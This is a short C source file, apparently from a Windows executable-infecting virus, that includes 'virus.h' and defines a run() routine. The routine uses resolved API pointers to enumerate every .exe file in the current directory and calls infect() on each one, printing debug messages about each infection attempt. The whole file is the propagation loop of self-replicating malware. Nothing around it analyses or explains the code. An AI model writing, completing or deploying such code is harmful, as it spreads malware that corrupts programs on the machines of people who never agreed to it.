#include "virus.h"

void run(void) {
  data_t data;

  if (init_data(&data, (void*)code_begin, (void*)code_end, (uint8_t*)run - (uint8_t*)code_begin) == 0) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    const char searchPattern[8] = { '.', '/', '*', '.', 'e', 'x', 'e', 0 };

    memzero(&findData, sizeof(WIN32_FIND_DATAA));
    hFind = data.functions.findFirstFileA(searchPattern, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
      do {
        PRINT_DEBUG("infecting %s...\n", findData.cFileName);
        if (infect(findData.cFileName, &data) == 0)
          PRINT_DEBUG("success!\n");
        else {
          PRINT_DEBUG("failure!\n");
        }
      } while (data.functions.findNextFileA(hFind, &findData));
      data.functions.findClose(hFind);
    }
  }
}
